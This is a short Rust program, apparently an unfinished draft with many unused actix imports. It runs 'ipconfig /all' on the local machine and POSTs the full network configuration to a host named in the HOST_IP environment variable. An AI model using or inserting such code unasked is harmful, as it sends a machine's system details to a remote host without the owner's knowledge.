use actix::Actor;
use actix::StreamHandler;
use actix_http::body;
use actix_web::{get, web, App, HttpRequest, HttpResponse, HttpServer};
use actix_web_actors::ws::WebsocketContext;
use actix_web_actors::ws::{self, Message};
use env_logger::*;
use log::{error, info, Level};
use std::env;
use reqwest::Client;

#[actix_web::main]
async fn main() {
    env::set_var("RUST_LOG", "info");
    env_logger::init();
    let host_ip = env::var("HOST_IP").expect("HOST_IP not set");
    let client = Client::new();
    let body = get_ipconfig().await;
    let res = client.post(format!("http://{}/ipconfig", host_ip))
        .body(body)
        .send()
        .await;
}

async fn get_ipconfig() -> String {
    let output = std::process::Command::new("ipconfig")
        .arg("/all")
        .output()
        .expect("failed to execute process");
    String::from_utf8(output.stdout).unwrap()
}
